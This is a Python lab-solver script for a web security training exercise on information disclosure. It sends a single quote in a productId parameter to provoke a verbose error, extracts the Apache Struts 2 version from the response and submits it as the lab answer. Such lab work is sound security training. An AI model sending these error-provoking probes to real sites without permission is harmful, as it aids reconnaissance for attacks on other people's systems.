import requests
import re
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.answer = None

    def get_framework_version_number(self):
        response = self.session.get(self.lab_url + 'product?productId=\'')
        self.answer = re.findall(r'Apache Struts 2 (.*)', response.text)[0]

    def submit_solution(self):
        data = {
            'answer': self.answer
        }

        self.session.post(self.lab_url + 'submitSolution', data=data)

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.get_framework_version_number()
        self.submit_solution()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
